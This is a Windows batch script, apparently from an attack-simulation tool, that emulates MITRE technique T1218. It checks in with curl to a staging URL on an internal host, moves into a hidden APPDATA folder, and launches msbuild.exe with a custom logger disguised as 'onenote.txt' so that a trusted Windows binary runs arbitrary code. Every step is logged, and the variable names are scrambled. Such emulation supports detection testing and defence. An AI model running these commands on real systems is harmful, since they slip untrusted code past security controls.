@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET pjkcpgw=%APPDATA%\9721\1b66f947
SET ebwae=https://10.0.0.49
SET drguvr=https://10.0.0.49/stage/2/icon.png?9721-7
SET hlbnp=ITZEL-S2B
SET pudaazx=7
SET syjfr=onenote.txt
SET ewjmdkff=9721
SET tsvar=!DATE!/!TIME!
SET xnvhgb=!APPDATA!\!pudaazx!\macula-simulations.log
SET uwzbav=0

echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_start>> "!xnvhgb!" 2>nul
curl -k -s -o nul "!drguvr!"
IF !ERRORLEVEL! EQU 0 (SET uwzbav=1) ELSE (SET uwzbav=0)
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: heartbeat_result=!uwzbav!>> "!xnvhgb!" 2>nul

echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_start>> "!xnvhgb!" 2>nul
cd /d "!pjkcpgw!" >nul 2>&1
IF !ERRORLEVEL! EQU 0 (SET uwzbav=1) ELSE (SET uwzbav=0)
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: chdir_result=!uwzbav!>> "!xnvhgb!" 2>nul

SET rcpqab=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: msbuild_start>> "!xnvhgb!" 2>nul
"!rcpqab!" /logger:LoggerEntry,"!syjfr!";MyParameters,Foo
IF !ERRORLEVEL! EQU 0 (SET uwzbav=1) ELSE (SET uwzbav=0)
echo [!tsvar!][DEBUG][!hlbnp!][!ewjmdkff!]: msbuild_result=!uwzbav!>> "!xnvhgb!" 2>nul

SET ybhkz=!DATE:~-4,4!-!DATE:~-10,2!-!DATE:~-7,2!
SET tbkyp=!TIME:~0,2!:!TIME:~3,2!:!TIME:~6,2!.!TIME:~-2,2!
IF !uwzbav! EQU 1 (SET fxusg=1&SET qkzpq=) ELSE (SET fxusg=0&SET qkzpq=execution_failed)
echo [!ybhkz! !tbkyp!][TTP][!hlbnp!][!ewjmdkff!]: T1218|Msbuild=!fxusg!:!qkzpq!>> "!xnvhgb!" 2>nul
ENDLOCAL